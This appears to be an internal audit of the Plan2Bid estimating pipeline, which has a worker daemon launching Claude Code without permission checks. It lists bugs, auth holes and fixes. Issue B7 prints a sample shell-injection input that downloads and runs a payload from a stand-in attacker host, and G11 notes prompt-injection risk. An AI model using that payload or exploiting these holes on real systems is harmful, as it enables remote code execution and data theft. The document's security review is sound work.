# Plan2Bid Master Audit -- Complete System Understanding

> This is the single source of truth for every known issue in the plan2bid pipeline.
> Add new findings at the bottom of the relevant section. Never delete resolved items -- mark them [RESOLVED] with date.
> Any `/plan` or `/implement` session should load this file first.

---

## HOW THE SYSTEM WORKS (the intended happy path)

### The Four Codebases

| Codebase | Location | Repo | Purpose |
|----------|----------|------|---------|
| **Frontend** | /tmp/plan2bid-claude/frontend/ | plan2bid-claude | React/Vite UI. User submits estimates, views results. |
| **Backend** | /tmp/plan2bid-claude/backend/ | plan2bid-claude | FastAPI API server. CRUD endpoints, talks to Supabase. |
| **Worker** | ~/Desktop/CODEBASES/estim8r/plan2bid-worker/ | github.com/omdiidi/workermacmini | Python daemon on Mac Mini. Polls for jobs, launches Claude Code. |
| **Skills** | ~/.claude-dotfiles/commands/plan2bid/ | github.com/nkpardon8-prog/claude-dotfiles | Claude Code slash commands. /plan2bid:run is the estimation engine. |

### The Complete Data Flow (8 steps)

**Step 1 -- User submits estimate (Frontend)**
- User fills form in `NewEstimate.tsx`: uploads ZIP of construction documents, enters project name, address, city/state/zip, facility type, project type, selects trade(s), writes 50+ word description
- Calls `POST /api/estimate` with multipart FormData

**Step 2 -- Backend creates job (Backend)**
- `estimates.py:141-205` handles the POST
- Uploads ZIP to Supabase Storage at `project-files/{job_id}/documents.zip`
- Inserts `projects` row with status="queued", stage="queued", progress=0, plus all form metadata
- Inserts `estimation_jobs` row with status="pending"
- Returns `{job_id, queue_position}` to frontend

**Step 3 -- Worker claims job (Worker)**
- `worker.py` polls `estimation_jobs` every 5 seconds for status="pending"
- Uses optimistic lock: PATCH WHERE status=pending to set status="running"
- Downloads ZIP from Supabase Storage, extracts to temp directory

**Step 4 -- Worker launches Claude Code (Worker)**
- Writes a `_run.sh` bash script with: `cd {tmpdir} && claude --dangerously-skip-permissions "{prompt}" && touch _done`
- Opens Terminal.app via osascript and runs the script
- Polls for `_done` flag file every 5 seconds, up to 30 min timeout

**Step 5 -- Claude Code runs estimation (Skills)**
- `/plan2bid:run` skill executes an 8-step pipeline: classify project, read documents, ask clarifying questions, define scope, material takeoff, pricing, markups, output
- For multi-trade: spawns one sub-agent per trade (sequential, not parallel)
- Saves result to `./estimate_output.json`

**Step 6 -- Claude Code saves to DB (Skills + Worker scripts)**
- `/plan2bid:save-to-db` skill runs `save_estimate.py --input ./estimate_output.json --project-id {id}`
- `save_estimate.py` decomposes the JSON into rows and writes to 11 Supabase tables
- Final step: sets `projects.status = "completed"` and `projects.total_estimate`

**Step 7 -- Worker detects completion (Worker)**
- `_done` flag appears when Claude Code exits (regardless of success)
- Worker marks `estimation_jobs.status = "completed"`

**Step 8 -- Frontend displays results (Frontend)**
- `Progress.tsx` polls `GET /api/estimate/status/{job_id}` every 2 seconds
- When status="completed", user clicks "View Results"
- `Results.tsx` calls `GET /api/estimate/{job_id}` which reads material_items, labor_items, anomaly_flags, metadata tables and merges them into `AggregatedEstimate`

### The 11 Tables Written by save_estimate.py

| # | Table | Operation | What it stores |
|---|-------|-----------|----------------|
| 1 | extraction_items | DELETE+INSERT per trade | Every line item with quantities, sources |
| 2 | extraction_metadata | UPSERT per trade | Item counts per trade |
| 3 | material_items | DELETE+INSERT per trade | Material line items with low/expected/high costs |
| 4 | material_metadata | UPSERT per trade | Material cost rollups, confidence counts |
| 5 | labor_items | DELETE+INSERT per trade | Labor line items with hours, rates, crew |
| 6 | labor_metadata | UPSERT per trade | Labor cost rollups, BLS data |
| 7 | anomaly_flags | DELETE+INSERT per trade | Flagged anomalies |
| 8 | site_intelligence | UPSERT | Site-specific findings |
| 9 | project_briefs | UPSERT | Project classification data |
| 10 | pipeline_summaries | UPSERT | Trades processed, warnings |
| 11 | projects | PATCH | total_estimate, status="completed" |

### The 7 Frontend Pipeline Stages (Progress.tsx)

| Stage | Expected progress | Written by worker? |
|-------|------------------|--------------------|
| ingestion | 2-5% | YES (worker.py:152) |
| parsing | 6-35% | NO |
| classification | 36-40% | NO |
| brief | 41-45% | NO |
| extraction | 50-65% | YES (worker.py:167, but as stage only, progress=10) |
| context | 66-67% | NO |
| pricing_labor | 68-85% | NO |

---

## ISSUE REGISTRY

### How to read each issue

Each issue has:
- **ID**: Category letter + number (e.g., A1, B3, G11)
- **Title**: What's broken in one line
- **Root Cause**: The underlying reason, not just the symptom
- **Files**: Every file involved with line numbers
- **The Problem in Detail**: Full explanation of what happens and why
- **Correct Behavior**: What should happen instead
- **Connections**: How this issue relates to other issues
- **Status**: OPEN, [RESOLVED YYYY-MM-DD], or [WONTFIX reason]

---

## A: SHOWSTOPPERS -- Pipeline cannot produce correct results

### A1: Worker doesn't pass project metadata to Claude Code
**Status:** OPEN
**Root Cause:** Worker was built to just pass project_id and documents. Nobody wired up the metadata lookup.

**Files:**
- `worker.py:169-173` -- the prompt that gets sent to Claude Code
- `worker.py:145-200` -- `_run_estimation_job` function
- `estimates.py:171-188` -- where backend stores the metadata in `projects` table
- `run.md:40-60` -- step 1 (Intake) where /plan2bid:run expects to receive project details

**The Problem in Detail:**
The worker builds this prompt:
```
Run /plan2bid:run to estimate this project. Project ID is {project_id}. 
Documents are in the current directory. 
When the estimate is complete, run /plan2bid:save-to-db {project_id}
```

The frontend collects and the backend stores:
- `selected_trades` -- JSON array like `["electrical"]` or `["electrical","plumbing","hvac"]` or `[]` (all trades)
- `project_description` -- 50+ word description, often with pre-estimation clarification Q&A appended
- `facility_type` -- one of 17 values (office, restaurant, retail, medical, etc.)
- `project_type` -- one of 11 values (new_build, tenant_improvement, renovation, etc.)
- `city`, `state`, `zip_code` -- for regional pricing and BLS labor rates
- `street_address` -- for site intelligence
- `project_name` -- for the estimate header

All of this is stored in the `projects` table row. The worker has the `project_id` and could easily read this row, but it doesn't.

**Correct Behavior:** After claiming the job, worker calls `db.get("projects", id=f"eq.{project_id}")` and includes all metadata in the prompt. The prompt should tell Claude exactly which trades to estimate, the project description, location, and type.

**Connections:** This is the #1 showstopper. Without trade selection, a single-trade electrical estimate would run all 14 trades. Without location, BLS labor rates are generic. Without facility_type, the /plan2bid:run skill's project classification (step 1) has no input. Fixing this also requires fixing B7/B8 (shell injection when user description enters the prompt, and clarifying questions stall).

---

### A2: No JSON schema for estimate_output.json
**Status:** OPEN
**Root Cause:** The /plan2bid:run skill was designed for interactive use where the user can see and verify the output. In daemon mode with save_estimate.py consuming it programmatically, the freeform output breaks everything.

**Files:**
- `run.md:145` -- "Save the structured estimate as JSON to ./estimate_output.json. If a JSON schema was provided in the system prompt, follow it precisely. If no schema was provided, use a reasonable structured format with line items grouped by trade."
- `save_estimate.py:14` -- `output.get("line_items", [])` -- expects flat array at top level
- `save_estimate.py:38` -- `if li.get("is_material")` -- expects boolean flag per item
- `save_estimate.py:59` -- `if li.get("is_labor")` -- expects boolean flag per item
- `save_estimate.py:131-205` -- all three `_to_*_row()` functions that read 50+ specific field names

**The Problem in Detail:**
save_estimate.py expects this EXACT structure:
```json
{
  "line_items": [          // MUST be a flat array at this exact key
    {
      "item_id": "EL-001", // unique string per item
      "trade": "electrical",
      "description": "...",
      "quantity": 10,
      "unit": "EA",
      "is_material": true,  // boolean -- without this, item is SKIPPED for material_items
      "is_labor": true,     // boolean -- without this, item is SKIPPED for labor_items
      "unit_cost_low": 8.0,
      "unit_cost_expected": 10.0,
      "unit_cost_high": 12.0,
      "extended_cost_low": 80.0,
      "extended_cost_expected": 100.0,
      "extended_cost_high": 120.0,
      "material_confidence": "medium",  // exact lowercase string
      "price_sources": [...],
      "pricing_method": "...",
      "crew": [...],
      "total_labor_hours": 5.0,
      "blended_hourly_rate": 65.0,
      "labor_cost": 325.0,
      "hours_low": 4.0,
      "hours_expected": 5.0,
      "hours_high": 6.5,
      "cost_low": 260.0,
      "cost_expected": 325.0,
      "cost_high": 422.50,
      "labor_confidence": "medium",
      // ... 20+ more fields
    }
  ],
  "anomalies": [...],
  "site_intelligence": {...},
  "brief_data": {...},
  "warnings": [...]
}
```

But run.md says "use a reasonable structured format with line items grouped by trade." Claude will likely produce:
```json
{
  "trades": {
    "electrical": { "items": [...] }  // NESTED, not flat -- save_estimate gets 0 items
  }
}
```
Or use different field names (`cost` instead of `labor_cost`, `confidence` instead of `material_confidence`). Or omit `is_material`/`is_labor` flags entirely, causing save_estimate to write 0 material rows and 0 labor rows -> total_estimate = $0.

**Correct Behavior:** Either:
- Add the exact JSON schema to run.md so Claude always produces the right format
- OR pass the schema in the worker prompt (run.md line 145 already says "If a JSON schema was provided in the system prompt, follow it precisely")

**Connections:** Even if A1 is fixed (metadata passed), the output will be wrong without this. Even if the output format is correct, A3 must also be fixed for save_estimate.py to actually run.

---

### A3: Hardcoded dev-machine paths in save-to-db skills
**Status:** OPEN
**Root Cause:** The save-to-db skill was written on the dev machine and the path was never parameterized.

**Files:**
- `save-to-db.md:16` -- `python ~/Desktop/CODEBASES/estim8r/plan2bid-worker/save_estimate.py`
- `save-scenario-to-db.md:18` -- `python ~/Desktop/CODEBASES/estim8r/plan2bid-worker/save_scenario.py`
- `supabase_client.py:6-10` -- `from dotenv import load_dotenv; load_dotenv()` + `import supabase_client as db`
- `save_estimate.py:6` -- `import supabase_client as db`

**The Problem in Detail:**
Three compounding failures when Claude runs save-to-db on a Mac Mini:

1. **Wrong path**: The skill says `python ~/Desktop/CODEBASES/estim8r/plan2bid-worker/save_estimate.py`. On a Mac Mini, the worker repo is at `~/plan2bid-worker/` or wherever the setup instructions put it. The path doesn't exist -> FileNotFoundError.

2. **Broken import**: Even if the path were correct, `save_estimate.py` does `import supabase_client as db`. Python looks for `supabase_client.py` in: (a) the same directory as save_estimate.py, and (b) PYTHONPATH. Since Claude Code's cwd is the temp directory (not the worker repo), and the script is invoked by absolute path, Python won't find supabase_client.py -> ModuleNotFoundError.

3. **Missing .env**: `supabase_client.py` calls `load_dotenv()` which searches cwd for `.env`. The cwd is the temp directory (extracted ZIP files). The `.env` with `SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` is in the worker repo directory. -> KeyError: 'SUPABASE_URL'.

**Correct Behavior:** The save scripts should either:
- Be invoked with the worker repo as cwd: `cd ~/plan2bid-worker && python save_estimate.py --input /tmp/xxx/estimate_output.json --project-id YYY`
- Or use an absolute path for .env: `load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))`
- Or be made fully self-contained (embed the Supabase client inline)

The skill paths need to use a variable or be relative to the worker repo location.

**Connections:** Even if A1 and A2 are fixed, this prevents any data from being saved. This is the third link in the chain: metadata -> schema -> save.

---

### A4: Scenario ID type mismatch
**Status:** [RESOLVED 2026-04-10] — Schema uses TEXT for scenarios.id, not UUID. The `scn_{hex}` format is valid. No mismatch.
**Root Cause:** Backend was written to generate human-readable prefixed IDs (`scn_abc123`), but the DB schema uses UUID columns.

**Files:**
- `scenarios.py:91` -- `scenario_id = f"scn_{uuid.uuid4().hex[:12]}"`
- DB schema, scenarios table -- `id uuid NOT NULL DEFAULT gen_random_uuid()`
- `save_scenario.py:11` -- reads `--scenario-id` arg and passes it as `scenario_id` to Supabase

**The Problem in Detail:**
`scenarios.py:91` generates IDs like `scn_a1b2c3d4e5f6` (16-char string). The `scenarios.id` column is `uuid NOT NULL`. PostgreSQL rejects non-UUID values on insert. The `queries.insert_scenario()` call will fail with a type error.

Since no scenario can be inserted, the downstream `estimation_jobs` row (which references `scenario_id` as a FK) also can't be created. The entire scenario feature is dead.

**Correct Behavior:** Either:
- Don't pass `id` in the insert and let the DB generate it via `DEFAULT gen_random_uuid()`
- Or change the column type to TEXT

**Connections:** Blocks all scenario functionality. save_scenario.py is unreachable. The scenario comparison feature, scenario polling, scenario details -- all depend on scenarios existing.

---

### A5: NameError crashes in 3 route files
**Status:** OPEN
**Root Cause:** When the codebase was refactored to use `get_optional_user_id` + DEV_UUID fallback, the imports in these 3 files were not updated.

**Files:**
- `sharing.py:6` -- `from app.auth import DEV_UUID, ProjectPermission, get_user_id, require_permission` (missing `get_optional_user_id`)
- `sharing.py:24` -- first usage: `user_id = get_optional_user_id(request) or DEV_UUID`
- `admin.py:6` -- imports `get_user_id, require_admin` (missing both `get_optional_user_id` and `DEV_UUID`)
- `auth_routes.py:6` -- imports `get_user_id` (missing `get_optional_user_id` and `DEV_UUID`)

**The Problem in Detail:**
Every endpoint in these 3 files hits `get_optional_user_id(request)` on its first line, which raises `NameError: name 'get_optional_user_id' is not defined`. The `except Exception as e` handler in each route catches it and returns 500 with message like "Failed to share by email: name 'get_optional_user_id' is not defined".

**Affected features:**
- All project sharing (email share, link share, accept share, list/update/delete shares)
- All admin (list projects, list users, delete user, list/create/revoke tokens)
- Signup token claim

**Correct Behavior:** Add `get_optional_user_id` to the import in each file. Or better: use `get_user_id` (strict auth) for admin endpoints, since admin should never fall back to DEV_UUID.

**Connections:** Independent of pipeline issues. Can be fixed separately. Blocks sharing and admin features.

---

## B: CRITICAL -- Wrong data, security holes, or silent failures

### B1: Worker marks job "completed" before verifying save succeeded
**Status:** OPEN
**Root Cause:** The `_done` flag is created by the shell script (`touch _done`) when Claude Code exits -- not when save_estimate.py succeeds.

**Files:**
- `worker.py:116-117` -- `_run.sh` script: `claude ...\ntouch "{done_flag}"`
- `worker.py:131` -- polls for `os.path.exists(done_flag)`
- `worker.py:178-181` -- on success: marks estimation_jobs status="completed"
- `save_estimate.py:117` -- sets projects.status="completed" as its final DB write

**The Problem in Detail:**
The sequence is:
1. Claude Code runs /plan2bid:run -> produces estimate_output.json
2. Claude Code runs /plan2bid:save-to-db -> save_estimate.py starts writing to DB
3. If save_estimate.py crashes mid-write (network error, schema mismatch, etc.), Claude Code reports the error and exits
4. On Claude exit, the shell runs `touch _done`
5. Worker sees `_done`, marks estimation_jobs as "completed"
6. But projects.status is still "running" (save_estimate never reached its final step)

Result: estimation_jobs says "completed" but projects says "running". The frontend polls projects.status and sees "running" forever. Or if save_estimate partially wrote some tables, the Results page shows incomplete data.

**Correct Behavior:** After detecting `_done`, worker should check: `db.get("projects", id=f"eq.{project_id}", select="status")`. If `status != "completed"`, mark the job as "error" with message "Save to database did not complete".

**Connections:** Related to F1 (no transactions). If save_estimate had transactions, a crash would roll back cleanly. Without transactions, the verification check is the only safety net.

---

### B2: Silent auth degradation to DEV_UUID
**Status:** OPEN
**Root Cause:** The pattern `get_optional_user_id(request) or DEV_UUID` was intended for development convenience but is used in production endpoints.

**Files:**
- `auth.py:20-28` -- `get_optional_user_id` returns None on invalid/expired JWT
- `auth.py:13` -- `DEV_UUID = "00000000-0000-0000-0000-000000000001"`
- Every route file -- `user_id = get_optional_user_id(request) or DEV_UUID`

**The Problem in Detail:**
When a user's JWT expires:
1. Frontend sends request with expired token
2. `get_optional_user_id` returns None (doesn't raise 401)
3. `None or DEV_UUID` evaluates to DEV_UUID
4. `queries.list_projects(DEV_UUID)` returns 0 projects (no projects belong to DEV_UUID)
5. User sees empty dashboard with no error message
6. Frontend never gets a 401, so it never triggers re-auth

This is the exact "projects disappear after 30 minutes" symptom the user reported.

**Correct Behavior:** Endpoints that require a real user should use `get_user_id(request)` which raises HTTP 401. The frontend's 401 handler then triggers sign-out and re-auth. Only truly public endpoints (sub-invite by token, health check) should use optional auth.

**Connections:** Related to B3 (DEV_UUID OWNER access) and B4 (queue no auth). The DEV_UUID pattern is the root cause of multiple auth issues.

---

### B3: DEV_UUID projects are world-accessible
**Status:** OPEN
**Root Cause:** `auth.py:36-37` has a special case that grants OWNER permission to any caller if the project belongs to DEV_UUID.

**Files:**
- `auth.py:34-37` -- `if project_uid == DEV_UUID: return ProjectPermission.OWNER`

**The Problem in Detail:**
The permission check says: "if this project is owned by DEV_UUID, return OWNER regardless of who's asking." Combined with B2 (unauthenticated requests become DEV_UUID), this means: any anonymous request can read/edit/delete any project that was created during development or by the worker using DEV_UUID.

**Correct Behavior:** Remove this check entirely, or gate behind `if os.environ.get("DEV_MODE") == "true"`.

---

### B4: Queue endpoints have zero authentication
**Status:** OPEN

**Files:**
- `estimates.py:458` -- `async def get_queue():` -- no Request parameter
- `estimates.py:469` -- `async def cancel_queue_job(job_id: str):` -- no Request parameter

**The Problem in Detail:**
These two endpoints take no `Request` parameter at all, so there's no way to identify or authenticate the caller. Any anonymous HTTP request can view all pending jobs (including project IDs) and cancel any pending job by ID.

**Correct Behavior:** Add `request: Request` parameter and auth check. Cancel should verify the job belongs to the requesting user.

---

### B5: Timeout/reaper infinite loop for large estimates
**Status:** PARTIALLY RESOLVED — Strict infinite loop prevented (worker marks error at 30 min before reaper fires at 35 min), but 30-35 min overlap window can still cause duplicate execution for legitimately slow jobs.
**Root Cause:** Timeouts were set for single-trade estimates (~15 min) but multi-trade GC estimates take 70-95 minutes.

**Files:**
- `worker.py:17` -- `JOB_TIMEOUT = 1800` (30 min)
- `worker.py:20` -- `STALE_THRESHOLD_MINUTES = 35`
- `worker.py:283-300` -- `reap_stale_jobs()` re-queues running jobs older than 35 min
- `worker.py:129-142` -- `_launch_claude_terminal` timeout loop

**The Problem in Detail:**
For a 14-trade GC estimate:
- Each trade takes 2-5 min in sub-agent mode (sequential)
- 14 trades x ~3.5 min = ~49 min just for sub-agents
- Plus document analysis, scope definition, etc. = 70-95 min total

At 30 min: `_launch_claude_terminal` returns False (timeout). Worker marks job as "error".
At 35 min: Even if the timeout hadn't fired, `reap_stale_jobs()` would re-queue the job to "pending", causing it to restart from scratch. This creates an infinite loop: run -> reap -> requeue -> run -> reap.

Additionally, G10 shows the reaper can re-queue THIS worker's own active job, causing duplicate execution.

**Correct Behavior:** JOB_TIMEOUT should be 2-3 hours. STALE_THRESHOLD should be JOB_TIMEOUT + buffer (e.g., JOB_TIMEOUT + 30 min). Reaper should exclude the current worker's active job. Add max retry count to prevent infinite requeue.

**Connections:** Related to G10 (self-requeue) and F3 (orphaned terminals on timeout).

---

### B6: osascript failure blocks worker 30 minutes
**Status:** OPEN

**Files:**
- `worker.py:121-123` -- `subprocess.Popen(["osascript", "-e", ...])`
- `worker.py:129-139` -- polling loop for _done flag

**The Problem in Detail:**
`subprocess.Popen` returns immediately. The return code is never checked. If osascript fails (no display session, Terminal not available, permission denied), the worker enters a 30-minute polling loop waiting for a `_done` flag that will never appear. During this time, the worker processes zero other jobs.

**Correct Behavior:** Check if the Terminal opened (e.g., verify the process is running after a short delay, or check osascript exit code via `proc.wait(timeout=5)`). Fail immediately if Terminal didn't open.

---

### B7: Shell injection via user input in bash script
**Status:** OPEN
**Root Cause:** User-supplied text (scenario_context, and project_description after A1 is fixed) is interpolated directly into a bash script inside double quotes.

**Files:**
- `worker.py:115` -- `f'claude --dangerously-skip-permissions "{prompt}"'` written to _run.sh
- `worker.py:219` -- `scenario_context` (user-supplied) interpolated into prompt

**The Problem in Detail:**
The prompt is embedded in a bash script between double quotes:
```bash
claude --dangerously-skip-permissions "Run /plan2bid:scenarios... Scenario context: {user_input}..."
```
If `scenario_context` contains `"`, `$()`, or backticks, the bash script breaks or executes unintended commands. For example: `what if $(curl attacker.com/payload | bash)`.

Note: Once A1 is fixed (passing project_description to the prompt), the same vulnerability applies to the project description field.

**Correct Behavior:** Write the prompt to a file and pass it via: `claude --dangerously-skip-permissions "$(cat prompt.txt)"`. Or use proper shell escaping. Or pass via stdin.

**Connections:** Must be fixed before A1 (adding user content to the prompt). Also related to G11 (prompt injection into Claude itself).

---

### B8: Clarifying questions stall daemon
**Status:** OPEN

**Files:**
- `run.md:76-85` -- Step 3: "Batch 3-5 questions... Over-ask rather than under-ask."
- `worker.py:169-173` -- prompt doesn't say "skip questions"

**The Problem in Detail:**
In interactive mode, /plan2bid:run asks the user 3-5 clarifying questions before proceeding. In daemon mode (Terminal window with no one typing), Claude may stall waiting for answers, consuming the entire 30-min timeout doing nothing.

The skill says at line 83: "The user can always say 'just go with your judgment'" -- but nobody says that in daemon mode.

**Correct Behavior:** Add to the worker prompt: "Do not ask clarifying questions. Proceed with your best judgment on all ambiguities. State your assumptions clearly in the output."

**Connections:** Must be addressed when fixing A1 (enriching the prompt).

---

## C: FRONTEND-BACKEND DATA CONTRACT MISMATCHES

### C1: Status endpoint doesn't return error messages
**Status:** OPEN
**Files:** estimates.py:252-262, Progress.tsx:317,553
**Root Cause:** The status response dict was built without an `error` key. The `error_message` column exists in the DB but is never included.
**Frontend expects:** `data.error` for toast message
**Backend returns:** No `error` field
**Result:** User sees "An unexpected error occurred" with no useful info.
**Fix:** Add `"error": project.get("error_message")` to status response.

### C2: Share accept never redirects
**Status:** OPEN
**Files:** api.ts:491-494, sharing.py:110, AcceptShare.tsx:24
**Root Cause:** Frontend checks `res.status === "accepted"`. Backend returns `{"accepted": True}` -- no `status` field.
**Result:** `res.status` is undefined, condition is false, user never redirected after accepting share.
**Fix:** Change backend to `{"status": "accepted", "project_id": ..., "permission": ...}`.

### C3: Sub-bids response shape wrong
**Status:** OPEN
**Files:** api.ts:835-838, subcontractors.py:257
**Root Cause:** Frontend expects `{bids_by_trade: Record<string, SubBid[]>}`. Backend returns a flat array.
**Result:** `result.bids_by_trade` is undefined. Bid grouping UI shows nothing.
**Fix:** Backend should group by trade before returning, or frontend should handle flat array.

### C4: Admin users missing computed fields
**Status:** OPEN
**Files:** api.ts:528-543, queries.py:497-506, AdminDashboard.tsx:264-282
**Root Cause:** DB has `roles` (plural array). Frontend expects `role` (singular). `runs_total` and `runs_today` are never computed.
**Result:** Admin dashboard shows "undefined" for role, 0 for run counts.

### C5: Health endpoint 404
**Status:** OPEN
**Files:** api.ts:657, main.py:61
**Root Cause:** Frontend prefixes `/api` to all requests. Backend registers health at `/health` not `/api/health`.
**Fix:** Change backend to `@app.get("/api/health")`.

### C6: Missing Content-Type on JSON requests
**Status:** [RESOLVED 2026-04-10] — Fixed in production UI merge. All 3 functions now have Content-Type headers.
**Files:** api.ts:552-555 (feedback), api.ts:629-632 (overrides), api.ts:648-651 (settings)
**Root Cause:** `fetch` with `body: JSON.stringify(...)` but no `Content-Type: application/json` header.
**Result:** FastAPI can't parse the body -> 422 Unprocessable Entity.

### C7: Admin token field name mismatches
**Status:** OPEN
**Files:** api.ts:568-578, queries.py:533
**Root Cause:** Frontend expects `used_by/used_at/is_active`. DB has `claimed_by/claimed/revoked`.
**Result:** Token usage display broken in admin dashboard.

### C8: Queue state shape mismatch
**Status:** OPEN
**Files:** api.ts:163-167, estimates.py:463
**Root Cause:** `running` returned as bare string, frontend expects `{job_id: string}`. Queued entries missing `position`.

### C9: Logs timestamp type mismatch
**Status:** PARTIALLY RESOLVED — Type declaration says `number` but backend sends ISO string. However, the field is never accessed at runtime (Progress.tsx only uses log.level and log.message). No crash, but type is wrong.
**Files:** api.ts:143, estimates.py:233
**Root Cause:** Frontend type says `number`, backend sends ISO string from `created_at`.

---

## D: SAVE SCRIPT <-> DB SCHEMA MISMATCHES

### D1: projects.warnings column doesn't exist
**Status:** OPEN
**Files:** save_estimate.py:120, DB schema (projects table)
**Root Cause:** save_estimate conditionally adds `warnings` to the project PATCH. The column doesn't exist.
**Risk:** If PostgREST rejects unknown columns, the entire PATCH fails -- meaning `status="completed"` and `total_estimate` also don't get set. This would make B1 even worse (project stuck in "running" forever).

### D2: extraction_metadata column names wrong
**Status:** OPEN
**Files:** estimates.py:328-329 reads `total_documents` / `total_pages`. Schema has `documents_searched` / `pages_searched`. save_estimate.py writes NEITHER.
**Result:** `total_documents_parsed` and `total_pages_parsed` always 0 in Results.

### D3: material_items missing fields
**Status:** OPEN
**Files:** save_estimate.py:154-176 omits `material_description`, `spec_reference`, `work_action`, `line_item_type`, `bid_group`.
**Result:** estimates.py:64 reads `material_description` -> always null.

### D4: save_scenario.py doesn't filter is_material
**Status:** OPEN
**Files:** save_scenario.py:19 vs save_estimate.py:38
**Root Cause:** save_estimate.py correctly filters `if li.get("is_material")`. save_scenario.py does not -- creates material rows for ALL items.

### D5: scenario_anomaly_flags type mismatch
**Status:** OPEN
**Files:** save_scenario.py:56-60, DB schema
**Root Cause:** `affected_items` column is `TEXT[]` (PostgreSQL array). Script passes JSON arrays. Type mismatch crashes insert.

### D6: labor_metadata missing hour range totals
**Status:** OPEN
**Files:** save_estimate.py:66-79
**What:** Never writes `total_hours_low/expected/high` to labor_metadata.

### D7: scenario_labor_metadata missing 7 columns
**Status:** OPEN
**Files:** save_scenario.py:43-50
**What:** Missing confidence counts, hour ranges, BLS data vs schema.

---

## E: WORKER / SKILL ENVIRONMENT ISSUES

### E1: Missing scripts from old Plan2BidAgent layout
**Status:** OPEN
**Files:** run.md:24-29, doc-reader.md:43-86, scope.md:58
**What:** Skills reference `~/Desktop/Projects/Plan2BidAgent/scripts/` (pdf_to_images.py, generate_excel.py, generate_pdf.py, search_docs.py, chunk_and_embed.py, plus a .venv and guidelines/). These don't exist on Mac Mini.
**Impact:** doc-reader vision mode breaks (needed for drawing analysis in the core pipeline).

### E2: Nested ZIP directories not handled
**Status:** OPEN
**Files:** worker.py:159
**What:** `extractall` preserves directory structure. Skills expect flat files in cwd.

### E3: No cwd guarantee for estimate_output.json
**Status:** OPEN
**Files:** run.md:145, save-to-db.md:13
**What:** Both use relative `./estimate_output.json`. Claude Code changing directories during execution breaks this.

### E4: pdfplumber not in requirements
**Status:** OPEN
**Files:** doc-reader.md:43-44, worker requirements.txt
**What:** Skills reference pdfplumber. Worker only has httpx + python-dotenv.

### E5: Inconsistent filter API in supabase_client.py
**Status:** OPEN
**Files:** supabase_client.py:22-67
**What:** `get()` needs `eq.` prefix. `patch()`/`delete()` auto-add `eq.` prefix. Mixed conventions.

---

## F: ERROR HANDLING GAPS

### F1: No transaction boundaries in save scripts
**Status:** OPEN
**Files:** save_estimate.py, save_scenario.py
**What:** 11 sequential HTTP calls. Mid-write crash = partial data. Delete-then-insert has a window where a trade has 0 items.

### F2: No retry logic
**Status:** OPEN
**Files:** supabase_client.py
**What:** Any transient HTTP error (502, timeout, connection reset) is a hard failure. A successful 30-min estimation can be lost because a single bookkeeping API call fails.

### F3: Orphaned Terminal processes
**Status:** PARTIALLY RESOLVED — Success path closes Terminal window. Timeout path does NOT close it. Processes accumulate on timeout.
**Files:** worker.py:134-137
**What:** On timeout, Terminal with Claude Code is NOT closed. Processes accumulate.

### F4: No submission idempotency
**Status:** OPEN
**Files:** estimates.py:141-205
**What:** Network drop after server processes = user retry = duplicate project+job.

### F5: Raw PostgREST errors leaked to users
**Status:** OPEN
**Files:** queries.py, all route handlers
**What:** httpx error text (table names, columns) in 500 responses.

### F6: Subcontractor update missing ownership check
**Status:** OPEN
**Files:** subcontractors.py:80-97, queries.py:415
**What:** `update_subcontractor` filters only by sub_id, not user_id.

### F7: Unauthenticated AI endpoints
**Status:** OPEN
**Files:** estimates.py:570,586,598
**What:** validate-description, transcribe-voice, polish-text have no auth. API credit abuse vector.

---

## G: ADDITIONAL FINDINGS FROM DEEP RESEARCH

### G1: project_shares column names all wrong
**Status:** OPEN
**Files:** sharing.py:41,74; subcontractors.py:129; queries.py:300,445-453
**What:** Code uses `token`, `shared_by_user_id`, `email`. Schema has `share_token`, `invited_by`, `shared_with_email`.

### G2: signup_tokens column names wrong
**Status:** OPEN
**Files:** queries.py:533,538
**What:** Code writes `claimed_by`/`claimed`. Schema has `used_by`/`is_active`.

### G3: accepted_at = "now()" stored as literal string
**Status:** OPEN
**Files:** sharing.py:49,107
**What:** PostgREST doesn't evaluate SQL. "now()" is stored as text.

### G4: Settings dual-write split brain
**Status:** OPEN
**Files:** app-context.tsx:136 -> user_preferences; queries.py:258,266 -> user_settings
**What:** Two different tables for settings. Frontend and backend never sync.

### G5: Synchronous blocking I/O in async handlers
**Status:** OPEN
**Files:** client.py:161-164, all route files
**What:** Every async handler calls synchronous httpx.Client. Blocks the event loop.

### G6: 5 of 7 pipeline stages never written
**Status:** PARTIALLY RESOLVED — Worker writes 2 of 7 stages (ingestion, extraction). Remaining 5 would need to come from Claude Code skill execution (external to worker repo).
**Files:** worker.py:152,167
**What:** Only ingestion and extraction stages set. Progress stalls at 10%.

### G7: material_metadata fetched but unused
**Status:** OPEN
**Files:** estimates.py:288
**What:** `mat_meta = queries.get_all_material_metadata(job_id)` called but never used in response.

### G8: 4 tables written but never read by Results
**Status:** OPEN
**What:** extraction_items, site_intelligence, project_briefs, pipeline_summaries.

### G9: SIGTERM not handled
**Status:** OPEN
**Files:** worker.py:338-361
**What:** launchd sends SIGTERM. Worker only catches SIGINT. Job left in "running".

### G10: Stale reaper can requeue own active job
**Status:** OPEN
**Files:** worker.py:283-300
**What:** After 35 min, reaper re-queues running jobs including current worker's. Causes duplicates.

### G11: Prompt injection via scenario_context
**Status:** OPEN
**Files:** worker.py:218-222
**What:** User text in Claude prompt with --dangerously-skip-permissions. Distinct from B7 (shell injection).

### G12: Zip bomb vulnerability
**Status:** OPEN
**Files:** worker.py:154-159
**What:** No size/path validation on extractall.

### G13: Frontend checks invalid status values
**Status:** [RESOLVED 2026-04-10] — Production UI handles both "failed" and "error" in Progress.tsx. utils.ts handles "partial".
**Files:** Progress.tsx:76-91 ("failed"), utils.ts:28-37 ("partial")
**What:** DB uses "error" not "failed". "partial" not a valid status.

### G14: Progress.tsx crash on null status
**Status:** OPEN
**Files:** Progress.tsx:585
**What:** `status.warnings.length` when status is null.

### G15: deleteProject removes UI on failure
**Status:** OPEN
**Files:** app-context.tsx:179-187
**What:** Project removed from UI even when API delete fails.

### G16: isSubmitting never reset on success
**Status:** OPEN
**Files:** NewEstimate.tsx:360-409
**What:** Only reset in catch block. Browser back may show disabled form.

### G17: Dashboard recentProjects unsorted
**Status:** OPEN
**Files:** Dashboard.tsx:15
**What:** `projects.slice(0, 6)` without sort.

### G18: Error projects routed to Results page
**Status:** OPEN
**Files:** Dashboard.tsx:109
**What:** Only running/queued go to Progress. Error goes to Results which may crash.

---

